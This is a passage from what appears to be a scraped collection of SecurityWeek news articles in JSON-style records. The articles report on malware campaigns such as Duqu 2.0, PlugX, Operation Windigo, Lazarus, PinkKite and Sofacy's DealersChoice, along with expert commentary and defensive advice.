in locations unique to each victim,” researchers explained. Kaspersky said the threat group behind this attack was careful not to leave too much evidence, but researchers did find some links to PlugX and Winnti, malware believed to have been developed by Chinese-speaking actors. The security firm has provided indicators of compromise (IoC) to help organizations detect these attacks. NetSarang has also published a security alert to inform customers of the steps that need to be taken to address the issue. Last month, NetSarang informed customers that it had released an update for Xshell after documents published by WikiLeaks revealed that the tool had been targeted by the CIA’s BothanSpy malware. " }

The attackers used a valid digital signature from Hon Hai Precision Industry Co. LTD (also known as Foxconn Technology Group). Foxconn manufactures electronics for a wide range of companies, including Apple and BlackBerry. The malware has been linked by security researchers to attacks on a number of targets, including venues tied to events and talks related to negotiations regarding Iran's nuclear program as well as Kaspersky Lab itself, which discovered Duqu 2.0 on its own internal systems earlier this year.  According to Kaspersky Lab, the certificate was issued by VeriSign and used to sign a driver designed to mask command-and-control traffic.  \"The attackers created an unusual persistence module which they deploy on compromised networks,\" Kaspersky Lab's Global Research & Analysis Team (GReAT) explained in a blog post. \"It serves a double function – it also supports a hidden C&C communication scheme. This organization-level persistence is achieved by a driver that is installed as a normal system service. On 64-bit systems, this implies a strict requirement for an Authenticode digital signature. We have seen two such persistence drivers deployed in the course of attacks.\" According to researchers at Kaspersky Lab, the attackers installed these malicious drivers on firewalls, gateways and servers with direct Internet access on one side and corporate network access on the other side. By using those drivers, the attackers can access internal infrastructure from the Internet, dodge log records in corporate proxy servers and maintain a form of persistence. \"In essence, the drivers are redirecting network streams to and from the gateway machine that runs it,\" the researchers explained. \"To forward connections, the attacker first has to pass a network-based “knocking” mechanism by using a secret keyword. We have seen two different secret keywords in the samples we collected so far: “romanian.antihacker” and “ugly.gorilla”.\" In the case of Duqu, the attackers have been careful not to use the same signature more than once, the researchers noted.  \"During our previous research into Stuxnet and Duqu we have observed digitally signed malware (using malicious Jmicron and Realtek certs),\" according to Kaspersky Lab. \"Stealing digital certificates and signing malware on behalf of legitimate businesses seems to be a regular trick from the Duqu attackers. We have no confirmation that any of these vendors have been compromised but our indicators definitely show that the Duqu attackers have a major interest in hardware manufacturers such as Foxconn, Realtek and Jmicron. This was confirmed in the 2014/2015 attacks, when we observed infections associated with hardware manufacturers from APAC, including ICS and SCADA computer equipment manufacturers.\" \"Another interesting observation is that besides these Duqu drivers we haven’t uncovered any other malware signed with the same certificates,\" the researchers continued. \"That rules out the possibility that the certificates have been leaked and are being used by multiple groups. It also seems to indicate the Duqu attackers are the only ones who have access to these certificates, which strengthens the theory they hacked the hardware manufacturers in order to get these certificates.\" " }

PlugX has been observed in numerous targeted attacks since 2012, particularly in campaigns launched by Chinese advanced persistent threat (APT) actors.  While monitoring PlugX infections, researchers at ESET noticed that some of the samples connected to the same command and control (C&C) domains. By analyzing the C&C domains, experts managed to identify the targets and determined that the attackers' goal is to harvest intelligence information on Russian, Afghan and Tajik military and diplomats. The campaign has been active since at least June 2014. According to the security company, the threat is distributed via spear phishing emails that carry maliciously crafted RTF documents and self-extracting RAR archives that have a .scr extension.  The documents are designed to exploit Microsoft Word vulnerabilities in an effort to install the malware on targeted systems. Experts have spotted two exploits: one for an older Word flaw (CVE-2012-0158), and one for a vulnerability patched by Microsoft in April (CVE-2014-1761).  CVE-2014-1761 has been exploited in the wild since at least March 2014 in numerous high-profile campaigns, including ones leveraging BlackEnergy, MiniDuke and Sednit. However, in the attacks analyzed by ESET, the exploit doesn't work correctly.   A clever technique used by the attackers involves a legitimate executable from Kaspersky that loads the malware into memory.  \"The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables and is a way to stay under the radar, since a trusted application with a valid signature among startup items is less likely to raise suspicion,\" ESET's Robert Lipovsky wrote in a blog post.  An interesting aspect of the campaign is that PlugX is not the only piece of malware identified on infected machines. Researchers have identified other RATs, keyloggers and file stealers as well. One of them is DarkStRAT, a piece of malware that's capable of executing shell commands, managing processes and services, and transferring files between the C&C and the infected host.  Experts have also spotted a file stealer that harvests files from fixed and removable drives, and network shares. The threat is also capable of collecting passwords, account and proxy information, and history of visited URLs from applications such as Internet Explorer, Firefox, and Outlook. Samples from both pieces of malware contain a digital signature associated with a company called \"Nanning weiwu Technology co.,ltd.\"  \"Since the functionality of these tools was partly overlapping with that of Korplug, it left us wondering whether the attackers were just experimenting with different RATs or were they supplementing some functionality that they were unable to accomplish,\" Lipovsky said. In August, FireEye revealed the details of a campaign called \"Poisoned Hurricane,\" which targeted organizations in the United States and Asia. In this operation, the attackers configured PlugX to connect to domains such as adobe.com and outlook.com. Researchers discovered that the malware resolved DNS lookups through the nameservers of a company that allowed anyone to create a free account with its hosted DNS service. " }

The finding was made by researchers from ESET, CERT-Bund, the Swedish National Infrastructure for Computing and other agencies. The servers are being hijacked by a backdoor Trojan as part of a campaign the researchers are calling 'Operation Windigo.' Once infected, victimized systems are leveraged to steal credentials, redirected web traffic to malicious sites and send as much as 35 million spam messages a day. \"Windigo has been gathering strength, largely unnoticed by the security community, for more than two and a half years and currently has 10,000 servers under its control,\" said Pierre-Marc Bureau, security intelligence program manager at ESET, in a statement. \"This number is significant if you consider each of these systems have access to significant bandwidth, storage, computing power and memory.\" Infected servers have been identified in the U.S., Germany, France and the U.K. According to the researchers, they are believed to redirect as many as half a million web visitors a day to malicious content. Windigo-affected websites attempt to infect visiting Windows computers with malware via an exploit kit, while Mac users are typically served advertisements for dating sites. iPhone owners are redirected to sites with adult content.    Operating systems altered by the spam component include Linux, FreeBSD, OpenBSD, Mac OS X and Windows, ESET said. ESET recommends webmasters and system administrators check their systems to see if they are compromised, and has published a detailed report presenting the findings and instructions on how to remove the malicious code if it is present.  According to ESET, Unix system administrators and webmasters can run the following command to see if their server is compromised or not: $ ssh -G 2>&1 | grep -e illegal -e unknown > /dev/null && echo “System clean” || echo “System infected”   If systems are found to be infected, ESET has advised administrators to wipe affected computers and reinstall the operating system and software. For a higher level of security in the future, technology such as two-factor authentication should be considered, ESET said. As SecurityWeek highlighted last month, there are many misconceptions around Linux security and attacks are not something only Windows users need to worry about. “There is a perception out there that Linux systems don't need additional security,” David Jacoby, a senior security researcher for the Global Research and Analysis Team at Kaspersky Lab, said at the Kaspersky Lab Security Analyst Summit last month. “This is a problem since Linux servers are increasingly coming under attack, he said.” The main threats facing Linux systems aren't zero-day vulnerabilities or malware, but things such as Trojanized applications, PHP backdoors, and malicious login attempts over SSH.  In October 2012, attackers breached several Web servers and installed a version of the“itsoknoproblembro” toolkit in order to launch a series of powerful DDoS attacks against banks and other financial institutions in the United States. The toolkit runs on both Linux and Windows. In November 2013, Symantec discovered that a group of sophisticated attackers developed a way to evade detection by using a Linux backdoor designed to hide communications. The full report on Operation Windigo from ESET is available here.  *Additional reporting by Mike Lennon " }

Earlier this month, experts reported that the systems of several banks in Poland had been infected with a new piece of malware. Research conducted by Symantec and BAE Systems revealed that the attacks had been part of a bigger campaign that targeted financial and other organizations across 31 countries since at least October 2016. The malware used in the attacks has been linked to a threat actor tracked as the “Lazarus Group,” which has been active since 2009 or earlier. The actor has targeted government, military, media, aerospace, financial and manufacturing organizations primarily in South Korea and the United States in both espionage and destructive campaigns. The list of high-profile attacks attributed to the group includes the 2014 attack on Sony, which some believe was carried out by North Korea. Links have also been found between Lazarus and the theft of $81 million from Bangladesh’s Central Bank. Security experts have often cautioned that attribution is difficult, especially since attackers can conduct so-called false flag operations, which aim to deceive observers. In the recent bank attacks linked to Lazarus, the actor apparently attempted to deceive researchers and make them believe that the malware was developed by Russian speakers. Experts at BAE Systems have analyzed half a dozen malware samples and identified several Russian words, including for command and control (C&C) communications. However, a closer analysis revealed that the commands were likely the result of an online translation and they would be difficult to understand for a native Russian speaker. For example, some words are written as they are pronounced (as shown by online translation services), not how they are actually written using Latin script. “Through reverse-engineering, we can see the use of many Russian words that have been translated incorrectly. In some cases the inaccurate translations have transformed the meaning of the words entirely. This strongly implies that the authors of this attack are not native Russian speakers and, as such, the use of Russian words appears to be a 'false flag',” BAE Systems researchers said in a blog post. “Clearly the group behind these attacks are evolving their modus operandi in terms of capabilities – but also it seems they’re attempting to mislead investigators who might jump to conclusions in terms of attribution,” they added.

{ "_id" : { "$oid" : "5b27c41b6cefc41c844ab29b" }, "Category" : "Malware", "Title" : "PinkKite POS Malware Is Small but Powerful", "Address" : "https://www.securityweek.com/pinkkite-pos-malware-small-powerful", "Date" : "March 16, 2018", "Article" : "A newly discovered piece of malware targeting point-of-sale (POS) systems has a very small size but can do a lot on the infected systems, security researchers reveal. Called PinkKite, the POS malware was observed last year as part of a large campaign that ended in December, but was only detailed last week at Kaspersky Lab’s Security Analyst Summit (SAS). Discovered by researchers at Kroll Cyber Security, the malware is believed to have appeared last year for the first time. Similar to previously observed POS malware families such as TinyPOS and AbaddonPOS, the new PinkKite has a very small size (it is less than 6kb) and uses its tiny footprint to evade detection. Despite this, however, the malware includes memory-scraping and data validation capabilities. Furthermore, Courtney Dayter and Matt Bromiley, who detailed the threat at last week’s SAS 2018, reveal that PinkKite uses a hardcoded double-XOR cipher to encrypt credit card numbers. It also features built-in persistence mechanisms, and a backend infrastructure that leverages a clearinghouse to exfiltrate data to (POS malware typically sends data to the command and control (C&C) server). In fact, the PinkKite operators used three clearinghouses (or depots) that the malware sent data to in the observed campaign. These were located in South Korea, Canada and the Netherlands, the researchers revealed. The use of clearinghouses likely made the data collection easier and allowed operators to distance themselves from the terminals, but it also made the operation very noisy. For distribution purposes, the attackers likely infected a system and then moved laterally across the targeted company’s network environment using PsExec. Next, the hackers used Mimikatz to extract credentials from the Local Security Authority Subsystem Service (LSASS), and then connected to the compromised systems to steal credit card data via a Remote Desktop Protocol (RDP) session. The PinkKite executable, the researchers discovered, attempts to pass as a legitimate Windows program and uses names such as Svchost.exe, Ctfmon.exe and AG.exe for that. Different versions of the malware exist, including a whitelist variant that specifically targets processes in a list, and a blacklist iteration that instead ignores certain processes. After scrapping credit card data from the system memory, PinkKite validates card numbers using a Luhn algorithm. It also employs a double-XOR operation to encode the 16 digits of the credit card number with a predefined key, and stores the data in compressed files that can hold as many as 7,000 credit card numbers each. Using a separate RDP session, the files are sent to one of the employed clearinghouses. These remote systems collected hundreds or thousands of malware output files, the researchers discovered. The attackers were stealthy enough to stay under the radar until the targeted organization was alerted on its customers’ credit card data being sold on the black market. Travis Smith, principal security researcher at Tripwire, told SecurityWeek in an email that, even if this powerful malware family has a little footprint, its size has nothing to do with how it can be detected. “A change on a static endpoint like a point-of-sale machine will stick out clearly with the proper controls. Application white listing is a quick and very effective way to prevent malware such as PinkKite from being allowed to run on a point-of-sale machine. However, if the adversaries were able to use Mimikatz to steal admin credentials, they could bypass controls such as the built in AppLocker available from Windows. Having layered controls which are designed for both mitigation and detection are key in a successful security architecture,” Smith said. He also pointed out that the malware’s small size forced it to rely heavily on network communication, which can be prevented and detected. “Since point-of-sale networks are also fairly static, any communication outside of an established baseline can be considered malicious until proven benign. Utilizing a whitelist set of firewall rules on the point-of-sale network will limit the malware from sending stolen credit cards to adversaries around the world,” Smith concluded. " }

One of the exploits leverages CVE-2017-0199, an Office vulnerability patched by Microsoft in April with its monthly security updates. The security hole had been exploited in attacks before Microsoft released a fix. An exploit has since been added to the toolkits of numerous threat groups, including cybercriminals and cyberspies linked to China and Iran. In the attacks observed by Cisco Talos, CVE-2017-0199 was used in combination with CVE-2012-0158, an old Office flaw that is still exploited in many campaigns. The cybercriminals have apparently attempted to use these vulnerabilities to deliver the Lokibot banking Trojan. The attack also drops an older version of Ramnit, but experts believe a Ramnit infection component may have been picked up by accident somewhere along the way. While the combination of exploits did not work as intended during Cisco’s tests, researchers have analyzed the code in order to determine what the attackers were hoping to accomplish. “The attackers did not seem to have a good quality assurance process or perhaps the technical expertise to understand what will happen if they simply included an automatically generated CVE-2012-0158 exploit in combination with CVE-2017-0199,” said Cisco’s Vanja Svajcer. In most attacks involving CVE-2017-0199, attackers send out specially crafted documents set up to exploit the vulnerability that exists in code responsible for handling OLE2Link embedded objects. By pointing a remote OLE2Link object to an HTML application file (HTA), the application will get executed and the malware is delivered. One problem with this attack is that Word informs the user that the document contains links which may refer to other files and asks them if they want to update the document. While exploitation takes place regardless of the user’s answer, the dialog could still raise suspicion.  In the attack exploiting both vulnerabilities, the initial document exploits CVE-2017-0199, but instead of an HTA file, the OLE2Link object points to another document exploiting CVE-2012-0158, which in turn fetches Ramnit and Lokibot. Due to some mistakes made by the cybercriminals, Word crashes when loading the second exploit. However, had the exploit chain worked, the malware would have been downloaded without the “document contains links” dialog being displayed. “One has to wonder why did the attackers use the combination of a newer and an older exploit at all? The combination would not be executed if the targeted system had a patch against either of the exploits. In addition, if the targeted system was vulnerable to CVE-2012-0158 it would be much easier for the attackers to use a single exploit targeting this vulnerability,” Svajcer explained. “An assumption we can make is that that the attackers used the combination to avoid Word displaying the prompt which may raise suspicions for the target end user. Another possibility is that they attempted to use this combination in order to avoid behavioral detection systems which may be triggering on the combination of Ole2Link in a word document and a download of an HTA file,” the expert added.

This highly sophisticated piece of malware has been used by threat actors in targeted attacks aimed at several major organizations, including Russia-based security firm Kaspersky Lab. Kaspersky Lab spotted Duqu 2.0 on its networks while testing a prototype of a new technology designed to detect advanced persistent threats (APTs). The malware evades detection by residing only in the system’s memory, and by using infected network gateways and firewalls to communicate with command and control (C&C) servers. The reason why the attackers targeted the security firm is unclear; they might have been after technologies, source code, information on the inner workings of the company, or details on ongoing investigations and research methods.  Kaspersky Lab wasn’t the only company targeted with Duqu 2.0. A majority of the new 2014 and 2015 infections are linked to P5+1 events and venues related to Iran nuclear talks. Symantec has also analyzed Duqu 2.0 and discovered that the attackers targeted a telecommunications operator in Europe, one in North Africa, and a Southeast Asian electronic equipment manufacturer. Infections have also been spotted in the United States, the United Kingdom, Sweden, India, and Hong Kong. Attribution is difficult so Kaspersky Lab and Symantec have refrained from pointing the finger at anyone, but one of the main suspects appears to be Israel. Experts contacted by SecurityWeek have commented on the similarities between these Duqu 2.0 attacks and other operations, the malware’s level of sophistication, methods that can be used to identify such threats, and the possible involvement of Israel. And the feedback begins... Dr. Fengmin Gong, co-founder & CSO, Cyphort: “Duqu 2.0 is no doubt by the same actor group as Duqu, and although Duqu 2.0 wasn’t reported until recently, the samples being analyzed were actually from 2014 suggesting threat activities started at least last year. As evidence of \"handwriting\" fingerprints, not only that there are clear derivative enhancements typically associated with newer releases of the same software from the same authors, the same logging design and code-assignment is used; the same bug exits in both the old Duqu and Duqu 2.0 samples. Duqu uses Cipher Block Chaining mode of AES encryption to protect its configuration file. The same prepare_key method (in object oriented programming) is used in both Duqu and Duqu 2.0, but the old Duqu version only supports fixed 256-bit encryption key while the new Duqu 2.0 support 128bit, 192bit, and 512bit keys with the addition of the parameter for key size; however, in the encryption implementation, both versions have a bug in handling the corner case where the input data is less than 16 bytes.  The first Duqu is like a \"cousin\" of Stuxnet. In light of Duqu 2.0 involvement in compromising Kaspersky, it is a safe bet that Duqu is associated with the \"Five Eyes\" alliance, comprising Australia, Canada, New Zealand, the United Kingdom and the United States, and possibly Israel. Duqu 2.0 comes with the most comprehensive and sophisticated set of payload capabilities for persistence, target-system dis-armoring, lateral spread, and data collection. Considering its discovered releases associated with important events.\" Andrew Conway, research analyst at Cloudmark: \"Though they never name them explicitly, Kaspersky goes to some lengths to present the evidence that Duqu is in fact the work of Israeli intelligence services. Firstly, they show the connections between the Duqu 1.0 attack and the Duqu 2.0 attack, and conclude that Duqu 2.0 could not have been written without access to Duqu 1.0 source code, which was never made public. By an analysis of the times of command and control activity and compiler timestamps, they concluded that the Duqu 1.0 attack came from a country that is located in the GMT+2 or +3 time zone, where the work week starts on Sunday and ends with a short day on Friday. They also noted that Jan. 1st appeared to be a business day in this country. Israel is the only country with a significant cyber espionage capability that matches this profile. (Parts of Russia are in the same time zone, but they don't work on Sundays.) Some of the Duqu attacks were targeted at the negotiations over Iran's nuclear program, which would also be consistent with Israel being responsible.  In attacks this sophisticated, some would consider the possibility that the U.S. intelligence services are responsible. However, Kaspersky points out that Duqu appears to be operating independently of the Equation group (in fact, they found one machine that was infected by both Duqu and Equation malware) and the Equation group is believed by some to be the NSA.  Duqu appears to be the most sophisticated nation state espionage tool yet discovered. It relies heavily on zero day vulnerabilities in Microsoft software to gain access and spread from machine to machine. I strongly suspect that the authors had access to Microsoft source code in order to discover and exploit these zero days. In his keynote address at the 2014 RSA conference, Microsoft's Scott Charney admitted that Microsoft source code was made available to foreign governments, so that they could ensure it was secure. This is actually the worst possible approach. Nation state security services have access to the source code to look for vulnerabilities, but white hat security researchers do not. If Microsoft is going to share their source code with potentially malicious actors, they should make it open source and offer a generous bug bounty, so that it is subject to security review by people who are actually interested in making the Internet more secure.\" Gautam Aggarwal, Chief Marketing Officer, Bay Dynamics: “There is a high chance this was a new variation of Duqu – i.e. in-memory attack so nothing gets written directly to the system, and there are no traces of this attack once the system goes through a reboot; hence it being extremely difficult to detect. As Kaspersky Lab shared that they are doing their due diligence to see what happened and what exactly was lost, the reason it is a challenge for them as this is most likely due to the fact that the attacker rebooted the system, leaving no traces of the attack or what was actually scanned within the system.  We definitely have not seen the end of this story. This is a very similar pattern to what happened to RSA in March 2011. They were the primary attack victim where RSA SecurID group was perpetrated which manufactures the Two-Factor hardware authentication tokens. In May 2011, we heard about a major data breach at US Defense Contractor Lockheed Martin. This was a secondary attack where attackers reportedly exploited Lockheed’s VPN access system, which allows employees to log in remotely by using their RSA SecurID hardware tokens. That suggests that whoever attacked Lockheed Martin may also have been behind the successful breach at RSA.  Similarly, my feeling is the attackers were looking for vulnerabilities in Kaspersky’s secure OS so that the same can be exploited at client sites where they are deployed. This is how attackers would inflict a larger collateral damage.” Jeremy Scott, senior research analyst, Solutionary: “The actors behind Duqu are speculative at best, but some have pointed fingers to the United States and/or Israel. Kaspersky discovered that Duqu infections, which were first discovered by CrySys, were common with Equation group intrusions. The actors have been dubbed “Duqu group” based on the malware itself or “Tilded team” based on the framework used for the malware development that uses a tilde (~) at the beginning of the files. There are also similarities with the “Tilded” framework in the Stuxnet and Flame code which leads researchers to believe that the actors behind Stuxnet are the same or working with the Duqu actors.  As far as the Kaspersky Lab intrusion, which was investigated and reported by Kaspersky, it’s not exactly clear the motivation of the intrusion. It’s not uncommon for APT groups to infiltrate security vendors to gain information about operations, products, detection methods, future products, etc. Again, purely speculative, but according to Kaspersky there was very specific information that they were focusing on.  Picking targets and target organizations by APT groups is not purely random as it is with the crimeware world. The actors behind Duqu, as well as Stuxnet, have a particular interest with Iran and its nuclear capabilities. I have not seen any specifics on the targeting of organizations involved in Iran nuclear talks, but it can be assumed that if targeting is happening then those involved would be good targets.” Aaron Shelmire, senior threat researcher, ThreatStream: \"At ThreatStream, we would be surprised if the advanced actors were not attempting to gather inside information from security organizations. These actors have a vested interest in understanding the defensive tools and techniques that are used to detect and stop them from reaching their objectives.  Kaspersky took a refreshing leadership position by publishing a detailed document of the intrusion and what their analysts found. Many of the general techniques described in the paper (such as relying upon driver-based tools on externally facing servers, while pivoting internally without the use of persistent tools) are not unique to that threat actor. These types of lessons learned are helpful to the security community as a whole, by providing analysts with a first-hand account of what offensive techniques they need to be able to detect and defend against. \" Muddu Sudhakar, CEO of Caspida: \"Duqu is a family of malware first discovered in 2011. It has significant code similarities to Stuxnet, suggesting that it may have originated from the same source or was written by actors with access to the Stuxnet source code. Earlier this spring, Kaspersky Lab discovered that it had been compromised with malware believed to be from the Duqu threat actors, and dubbed the attack \"Duqu 2.0.  Both the original and the new Duqu attack leverage advanced techniques such as zero-day vulnerabilities and stolen code-signing certificates. Both attacks also appear to be modular platforms for information stealing – the original attack gathered information about industrial control systems, with the ability to steal digital certificates and private encryption keys. In light of these and other factors, many security professionals believe that the Duqu threat group is sponsored by Israel with the aim of targeting Iran's nuclear program.  The recent Duqu 2.0 attack is yet another example of how sophisticated threats are able to fool existing security gateways. In this case, Duqu's creators learned about Kaspersky Lab’s methods in order to write malware capable of evading known blocking techniques. These increasingly sophisticated techniques illuminate the limitation of static rules or signature based techniques, regardless of how advanced they might be.\" Oliver Tavakoli, Vectra Networks CTO: “The Duqu 2.0 attack is a perfect example of why behavioral approaches to detection are essential in the face of a sophisticated attack. From Kasperky’s analysis, the attackers exploited zero-day vulnerabilities to infect a user and gain administrator privileges. From this point, the attacker performed an internal reconnaissance and then performed a pass-the-hash technique to move laterally within the network. The attackers then created MSI packages to infect additional machines.  While the exploits of the zero-day vulnerabilities were undetectable, the reconnaissance and spreading behaviors that followed are clearly observable by tracking the internal behavior on the network. Although the attack was sophisticated, the fundamental steps required to advance the attack toward the attacker’s ultimate goal remain the same. There will always be new vulnerabilities and exploits, but the attacker’s actions after gaining a foothold will continue to give them away.” Morten Kjaersgaard, Heimdal Security CEO: “The attack on Kaspersky is unfortunate and it relates to a reality that all security companies need to be aware of:  We need to accept that we are a more interesting target than many others. It’s very important that both businesses and individuals acknowledge the threat posed by Duqu/Stuxnet type of worms and that they are actively used for spying across the world.  The fact that multiple Zero Day vulnerabilities were used in the ill fated attack against Kaspersky shows the imperative need to keep our software updated at all times to patch vulnerabilities and reduce the risk of infection. For example, Adobe’s critical update for Flash Player released on June 9 or one of the 8 security vulnerabilities patched by Microsoft this month could have been used in this attack.  Either as a business owner or individual user, you need to move quickly on getting rid of vulnerabilities, as they are the prefered attack angle for cyber criminals in more than 70% of cases. Having accepted your risk of unknowingly having an infection, you must also actively protect against data leakage by using an APT protection solution to block threats and monitor what is happening on your devices.  We are all obliged to contribute to the fight against cyber crime the best way we can.” Patrick Belcher, Director of Malware Analysis at Invincea: \"The Duqu2 attack showed some similarities to the Anthem and White House APT attacks. In each instance, the victims were highly security-aware personnel - people who are taught to be wary of email attachments and links - yet they fell prey to spear-phishing. This trend highlights that despite current defense-in-depth approaches and security training, the soft target remains the user behind the keyboard. Unless the industry gets serious about hardening end user devices through breach prevention technology, this trend will likely continue.\" Rob Sadowski, Director of Technology Solutions at RSA: “This attack on Kaspersky should provide further incentive for organizations to frequently update their risk and threat assessments and broaden their aperture as concerns potential attackers. Many more private sector organizations need to consider the possibility of nation-state or nation-state level actors targeting their operations or intellectual property and adjust their defense strategies accordingly. Despite the importance of continuous risk assessment and re-evaluation, in recent RSA research, 45% of global organizations described their capabilities as non-existent or ad hoc in this essential discipline, a troubling sign.  The details disclosed about the attack and the attacker TTPs also demonstrate how essential granular network and endpoint forensics are in detecting the activity of highly sophisticated attackers, as well as the required capability to move beyond detection of a single infected host to a full picture of all the adversary’s activity inside the compromised infrastructure in order to disrupt and remediate this level of attack.” Karl Sigler, Threat Intelligence Manager at Trustwave: “Duqu 2.0 is YAAPT (Yet Another Advanced Persistent Threat) using anti-forensic evasion techniques and zero day exploits. Targeted attacks like these go to long lengths to prevent being detected. The campaign utilized three zero day vulnerabilities, gained domain administrative access and spread itself to other systems as an MSI file. Unlike most malware campaigns, it also avoided permanence or persistence in order to achieve a higher level of stealth. It’s clear the criminals behind this campaign have in-depth technical expertise.  Network monitoring can provide an early warning to these types of attacks. In fact, this campaign was initially spotted through some anomalous, unexpected network traffic. The campaign also demonstrates that there is no such thing as 100% security. Being able to identify a compromise quickly and recover after a breach is just as important as the proactive measures to prevent a breach from the get-go. Our recently released 2015 Trustwave Global Security Report shows that in 2014 there was a median time of just over two weeks from intrusion to containment for organizations that detect a breach themselves. For organizations that found out through a third party they had been breached the median time from intrusion to containment was 154 days.” Dan Lohrmann, Chief Strategist and CSO of Security Mentor: “Based on the reports by Kaspersky, and independently verified by Symantec, Duqu 2.0 is another example of the growing number of advanced cyber-threats being used by nation-states in the most sensitive of situations. These advanced, expensive cyber-weapons are being created at the high end of the “cyber food chain.” We have entered a new era which is similar to the Cold War in the 20th century, with 21st century cyber weapons being used in place of nuclear weapons.  However, unlike with nuclear weapons, there is a major impact to global business in the use of these new cyber-weapons. New types of malware are trickling down in various forms to be used to steal intellectual property and infiltrate organization’s most sensitive communications and secrets. Inevitably, when this malware genie is out of the bottle, it is very difficult to control what happens next. Welcome to the new world of cyber espionage.” Ivan Shefrin, Vice President, Security Solutions, TaaSera: “The recently publicized Duqu 2.0 attacks on both the Iran nuclear negotiations and Kaspersky Labs have several facts in common: both were targeted, meant to steal highly confidential information, and undiscovered until after a data breach occurred.  They also highlight the need for IT security teams to find new ways for early detection. Our industry needs to move beyond traditional signature-based firewall and antivirus defenses. We should more aggressively implement behavior-based solutions for uncovering hidden malicious breach indicators moving laterally within their target environments. We must pair behavior detection with automated analytics that speed detection and response time for the professionals tasked with intervention.” " }

Google’s Gmail service has more than one billion active users and the company says it blocks hundreds of billions of attacks aimed at these accounts every week. At the RSA Conference this week, the search giant shared some insight on the threats targeting corporate inboxes and how the numbers compare to other types of accounts. Data collected so far this year shows that a corporate email account is 4.3 times more likely to receive malware, 6.2 times more likely to receive a phishing email, and 0.4 times more likely to receive spam compared to personal inboxes. While corporate accounts seem to be attackers’ favorite targets when it comes to spam and phishing, non-profit, education and government organizations are more likely to see malware attacks compared to businesses. The entertainment, IT, and housing sectors are the most targeted in spam campaigns, but phishing attacks are more likely to be aimed at the finance and insurance sector. When it comes to malware attacks, real estate was by far the most targeted sector.  Sectors most targeted by malware in first part of 2017 The volume of phishing attempts depends on location – for instance, the financial sector in Japan receives a lot more phishing emails than in the United States and the United Kingdom. Google also noticed that the IT industry in Brazil sees roughly twice as many phishing attempts than in the U.S. and the U.K. Japan and India are the countries with the most spammed inboxes, and the U.S., Germany and France are the largest spammers. In the first part of 2017, the highest percentage of phishing emails were sent to accounts in Japan, followed at a distance by Brazil, Canada and the United States. Google’s experts pointed out that targets are selected based on several criteria, including size, type of organization, sector of activity, and location (country). That is why they believe defenses must be tailored based on each organization’s risk profile. " }

Tied to attacks on businesses from Target to Neiman Marcus, POS malware is becoming more prevalent in the cyber-underground. \"The fourth quarter of 2013 will be remembered as the period when cybercrime became real for more people than ever before,\" said Vincent Weafer, senior vice president for McAfee Labs, in a statement. \"These cyber thefts occurred at a time when most people were focused on their holiday shopping and when the industry wanted people to feel secure and confident in their purchases. The impact of these attacks will be felt both at the kitchen table as well as the boardroom table.\" \"For security practitioners, the off-the-shelf genesis of some of these crime campaigns , the scale of operations, and the ease of digitally monetizing stolen customer data all represent a coming of age for both Cybercrime-as-a-Service and the dark web overall,\" he said.  Several POS malware families have grown in prevalence during the past few years, including BlackPOS, Dexter, ProjectHook and others, many of which are available for purchase online. According to researchers at McAfee, BlackPOS for example is an 'off-the-shelf' exploit kit for sale that can easily be modified and redistributed with \"little programming skill or knowledge of malware functionality.\" The source code for BlackPOS has also been leaked multiple times, allowing anyone to modify or employ the code for their own purposes. \"POS systems, just like any other computing system, are susceptible to attacks against unpatched software, the global internet, traffic interception and physical compromise or architectural flaws,\" said Michael Belton, head of Rapid7’s assessment team. \"Based on our experience with these systems, common configuration errors, missing patches and compromised user credentials are the most common points of attack.\" Just recently, Arbor Networks took a look at the Dexter malware and tied a person operating under the alias 'rome0' to activity around it. Just who that is remains a mystery. \"The individual using the name 'rome0' is well established in the underground carding scene,\" explained Dave Loftus, security research analyst at Arbor Networks. \"While his or her true identity is unknown, we believe he or she may reside in France based on information obtained from multiple carding forums. We [also] have seen Alina, Project Hook, Dexter, VSkimmer, and JackPos point-of-sale malware used by someone operating under the name 'Rome0'. It's still unclear if this is the same individual active on underground forums or an imposter.\" Back in November, Arbor Networks' Security Engineering & Response Team (ASERT) found multiple vulnerabilities in two versions of Dexter's control panel that allow stolen data to be stolen by malicious third-parties for a second time after being stolen by the malware the first.    \"ASERT does not have an exact count of the number of worldwide Dexter or Project Hook attacks, but we estimate that the number of infections is in the thousands based on the infection data obtained so far,\" Loftus said. \"We have seen concentrations of Dexter infections within the APAC region, and Project Hook within North America and Europe.\" \"We believe smaller organizations have been primarily targeted by these threats,\" he explained. \"Dexter and Project Hook are commodity malware that are not tailored to their targeted organizations. Therefore, due to their general nature and the types of businesses that we have seen compromised, smaller organizations that have relaxed security practices are most likely at risk.\" It is important to note that regulatory compliance does not equal security - something underscored by the Target breach, Belton noted. \"A company's security posture is only as strong as their weakest business partner,\" he said, adding that \"there is no such thing as perfect security. Target heavily invested in protecting customer data, but the fact that a strong security program can be undermined with smart planning is certainly unsettling.\" Related Reading: Cybercriminals Entrenched in 'Dark Web': Researchers  " }

The United States on Thursday announced sanctions against Russian spy agencies and more than a dozen individuals for trying to influence the 2016 presidential election and launching cyberattacks, including the destructive NotPetya campaign and operations targeting energy firms. The Department of Homeland Security and Federal Bureau of Investigation issued a joint technical alert via US-CERT last year to warn about attacks launched by a group known as Dragonfly, Crouching Yeti and Energetic Bear on critical infrastructure. Researchers previously linked Dragonfly to the Russian government and now the DHS has officially stated the same. US-CERT has updated its alert with some additional information. The new version of the alert replaces “APT actors” with “Russian government cyber actors.” The DHS said that based on its analysis of malware and indicators of compromise, Dragonfly attacks are ongoing, with threat actors “actively pursuing their ultimate objectives over a long-term campaign.” This is not the first time the U.S. has imposed sanctions on Russia over its attempt to influence elections. Russia has also been accused by Washington and others of launching the NotPetya attack last year. The Kremlin has always denied the accusations, but President Vladimir Putin did admit at one point that patriotic hackers could be behind the attacks. If Dragonfly and Sofacy (aka Fancy Bear, APT28, Sednit, Tsar Team and Pawn Storm) are truly operating out of Russia, they don’t seem to be discouraged by sanctions and accusations. On March 12 and March 14, security firm Palo Alto Networks spotted attacks launched by Sofacy against an unnamed European government agency using an updated variant of a known tool. Sofacy has been using a Flash Player exploit platform dubbed DealersChoice since at least 2016 and it has continued improving it. The latest version has been delivered to a government organization in Europe using a spear phishing email referencing the “Underwater Defence & Security” conference, which will take place in the U.K. later this month. What makes the new version of DealersChoice interesting, according to Palo Alto Networks, is the fact that it employs a clever evasion technique that has not been seen in the past. Older versions of DealersChoice loaded a malicious Flash object as soon as the bait document was opened. The latest samples, however, include the Flash object on page three of the document and it’s only loaded if users 